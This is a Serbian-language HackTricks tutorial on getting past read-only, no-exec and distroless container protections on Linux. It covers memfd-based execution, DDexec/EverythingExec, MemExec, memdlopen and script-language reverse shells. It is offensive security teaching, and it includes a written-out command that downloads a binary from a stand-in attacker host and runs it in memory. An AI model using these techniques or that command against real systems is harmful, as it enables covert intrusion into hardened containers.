# Zaobilaženje zaštite fajl sistema: samo čitanje / bez izvršavanja / Distroless

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Video snimci

U sledećim video snimcima možete pronaći tehnike koje su pomenute na ovoj stranici objašnjene detaljnije:

* [**DEF CON 31 - Istraživanje manipulacije memorijom Linux-a za prikrivanje i izbegavanje**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Prikriveni upadi sa DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scenario samo čitanje / bez izvršavanja

Sve je češće da se na Linux mašinama koristi **zaštita fajl sistema samo za čitanje (ro)**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa fajl sistemom samo za čitanje jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je fajl sistem montiran kao samo za čitanje, **`/dev/shm`** će i dalje biti upisiv, tako da nije tačno da ne možemo ništa pisati na disk. Međutim, ovaj folder će biti **montiran sa zaštitom bez izvršavanja**, pa ako ovde preuzmete binarni fajl, **nećete moći da ga izvršite**.

{% hint style="warning" %}
Sa perspektive crvenog tima, ovo otežava **preuzimanje i izvršavanje** binarnih fajlova koji nisu već prisutni u sistemu (kao što su zadnja vrata ili enumeratori kao što je `kubectl`).
{% endhint %}

## Najlakše zaobilaženje: Skripte

Primetite da sam pominjao binarne fajlove, možete **izvršiti bilo koju skriptu** sve dok je interpreter prisutan na mašini, kao što je **shell skripta** ako je `sh` prisutan ili **python** **skripta** ako je instaliran `python`.

Međutim, ovo nije dovoljno da biste izvršili svoj binarni zadnji ulaz ili druge binarne alate koje možda trebate pokrenuti.

## Zaobilaženje memorije

Ako želite da izvršite binarni fajl, ali fajl sistem to ne dozvoljava, najbolji način da to uradite je **izvršavanje iz memorije**, jer se **zaštite ne primenjuju tamo**.

### Zaobilaženje FD + exec syscall

Ako imate neke moćne skriptne mašine na mašini, kao što su **Python**, **Perl** ili **Ruby**, možete preuzeti binarni fajl za izvršavanje iz memorije, sačuvati ga u deskriptoru fajla u memoriji (`create_memfd` syscall), koji neće biti zaštićen tim zaštitama, a zatim pozvati **`exec` syscall** navodeći **fd kao fajl za izvršavanje**.

Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binarni fajl i on će generisati skriptu na naznačenom jeziku sa **binarnim fajlom kompresovanim i b64 enkodiranim** sa instrukcijama za **dekodiranje i dekompresiju** u **fd** koji je kreiran pozivanjem `create_memfd` syscall-a i pozivom **exec** syscall-a za pokretanje.

{% hint style="warning" %}
Ovo ne funkcioniše u drugim skriptnim jezicima poput PHP-a ili Node-a jer nemaju **podrazumevani način za pozivanje sirovih syscalls** iz skripte, pa nije moguće pozvati `create_memfd` da se kreira **memorijski fd** za čuvanje binarnog fajla.

Osim toga, kreiranje **redovnog fd-a** sa fajlom u `/dev/shm` neće raditi, jer nećete moći da ga pokrenete zbog primene **zaštite bez izvršavanja**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **modifikujete memoriju vašeg sopstvenog procesa** tako što ćete prebrisati njegov **`/proc/self/mem`**.

Stoga, **kontrolišući asemblerski kod** koji se izvršava od strane procesa, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljni kod**.

{% hint style="success" %}
**DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj sopstveni **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici pogledajte Github ili:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodni sledeći korak od DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite **pokrenuti drugi binarni fajl** ne morate ponovo pokretati DDexec, već možete samo pokrenuti memexec shellcode putem DDexec tehnike i zatim **komunicirati sa ovim demonom da biste preneli nove binarne fajlove za učitavanje i pokretanje**.

Možete pronaći primer kako koristiti **memexec za izvršavanje binarnih fajlova iz PHP reverse shell-a** na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnim ciljem kao i DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način učitavanja binarnih fajlova** u memoriju radi kasnijeg izvršavanja. Može čak omogućiti učitavanje binarnih fajlova sa zavisnostima.

## Bypassovanje Distroless

### Šta je distroless

Distroless kontejneri sadrže samo **apsolutno neophodne komponente za pokretanje određene aplikacije ili servisa**, kao što su biblioteke i zavisnosti za izvršavanje, ali isključuju veće komponente poput upravljača paketa, shell-a ili sistemskih alata.

Cilj distroless kontejnera je **smanjenje površine napada kontejnera eliminisanjem nepotrebnih komponenti** i smanjenje broja ranjivosti koje mogu biti iskorišćene.

### Reverse Shell

U distroless kontejneru možda **nećete čak ni pronaći `sh` ili `bash`** da biste dobili običan shell. Takođe nećete pronaći binarne fajlove poput `ls`, `whoami`, `id`... sve što obično pokrećete na sistemu.

{% hint style="warning" %}
Stoga, nećete moći dobiti **reverse shell** ili **izlistati** sistem kao što obično radite.
{% endhint %}

Međutim, ako je kompromitovani kontejner pokrenut na primer kao flask web, tada je instaliran Python, i stoga možete dobiti **Python reverse shell**. Ako se pokreće node, možete dobiti Node reverse shell, i isto važi za većinu **skriptnih jezika**.

{% hint style="success" %}
Koristeći skriptni jezik, možete **izlistati sistem** koristeći mogućnosti jezika.
{% endhint %}

Ako ne postoje **zaštite `read-only/no-exec`**, možete zloupotrebiti svoj reverse shell da **pišete u fajl sistem vaše binarne fajlove** i **izvršavate** ih.

{% hint style="success" %}
Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali možete koristiti **prethodne tehnike izvršavanja iz memorije da ih zaobiđete**.
{% endhint %}

Možete pronaći **primere** kako iskoristiti neke RCE ranjivosti da biste dobili **reverse shell-ove skriptnih jezika** i izvršili binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
